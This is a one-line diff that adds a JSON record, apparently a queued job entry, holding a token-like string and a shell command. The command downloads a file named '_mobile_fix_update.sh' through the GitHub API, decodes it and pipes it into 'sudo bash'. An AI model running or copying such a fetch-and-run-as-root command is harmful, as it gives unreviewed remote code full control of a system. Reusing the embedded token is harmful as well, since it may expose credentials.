@@ -1,0 +1,1 @@
+{"id": "20261120-145314-6a5464", "token": "r1ujjQBjnj2nzf9nYBoHLtUxkcrZPfVx", "script": "curl -sSL \"https://api.github.com/repos/mo-xing-alt/xinmo-site/contents/_mobile_fix_update.sh\" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)[\"content\"]).decode(),end=\"\")' | sudo bash", "ts": 1795157594}
